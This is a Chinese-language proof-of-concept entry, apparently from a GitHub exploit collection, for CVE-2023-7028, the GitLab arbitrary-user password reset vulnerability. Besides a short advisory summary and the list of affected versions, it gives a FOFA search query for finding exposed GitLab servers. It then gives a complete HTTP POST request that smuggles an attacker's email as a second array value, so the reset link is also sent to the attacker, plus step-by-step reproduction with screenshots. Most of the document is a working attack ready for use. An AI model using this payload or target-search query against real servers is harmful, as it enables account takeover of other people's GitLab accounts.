## GitLab任意用户密码重置漏洞(CVE-2023-7028)

2024年1月11日，Gitlab 官方披露 CVE-2023-7028，GitLab 任意用户密码重置漏洞，官方评级严重。攻击者可利用忘记密码功能，构造恶意请求获取密码重置链接从而重置密码。官方已发布安全更新，建议升级至最新版本，若无法升级，建议利用安全组功能设置 Gitlab 仅对可信地址开放。

1、需获取系统已有用户注册邮箱地址

2、满足影响版本

## 影响版本
```
16.1 <=GitLab CE<16.1.6
16.2 <=GitLab CE<16.2.8
16.3 <=GitLab CE<16.3.6
16.4 <=GitLab CE<16.4.4
16.5 <=GitLab CE<16.5.6
16.6 <=GitLab CE<16.6.4
16.7 <=GitLab CE<16.7.2
16.1 <=GitLab EE<16.1.6
16.2 <=GitLab EE<16.2.8
16.3 <=GitLab EE<16.3.6
16.4 <=GitLab EE<16.4.4
16.5 <=GitLab EE<16.5.6
16.6 <=GitLab EE<16.6.4
16.7 <=GitLab EE<16.7.2
```

## fofa
```
app="GitLab"
```

## poc
```
POST /users/password/ HTTP/1.1
Host: g
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Origin: https://git.ryzoweba.com
Connection: keep-alive
Cookie: _gitlab_session=78331028df93ce92682f77ac91945004; preferred_language=en
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

authenticity_token=Ok6w7Wt0FwKeOCci9ucskZWrjRDDV0kYkwlSOIrGQmmQ2fk5k3vsH-8vM5UIiGn-0tpJ9D78SUb-9AT1TZ8VfA&user%5Bemail%5D=目标邮箱&user[email][]=攻击者邮箱
```

## 漏洞复现
访问找回密码页面：/users/password/new
![2af3cf985729d3808db6273dcc07b84b](https://github.com/wy876/POC/assets/139549762/f48c3792-5d70-4cea-a2f5-1ac3a1e3af6e)

填写被找回邮箱地址，然后点击抓包
![7d63bb3712a59358211cd86b02d52674](https://github.com/wy876/POC/assets/139549762/5fb2529f-50a5-44ce-923a-ad6f7b1eb631)

修改请求包为：user[email][]=目标邮箱地址&user[email][]=攻击者邮箱地址
![f7080e955aa0be982d53c73f2d817696](https://github.com/wy876/POC/assets/139549762/71fb4d67-891b-4388-a059-7b609605ff2b)

![3dd9cf887b37a83c2d1e7290f2e1b78f](https://github.com/wy876/POC/assets/139549762/ba695d81-ae4d-4fc8-b35b-27074a5973d3)


## 漏洞来源
- https://mp.weixin.qq.com/s/fFjOhcjtYh-hYsdYDsCA1Q
- https://mp.weixin.qq.com/s/xtCIo0ybgK2obPVZtKNQEQ
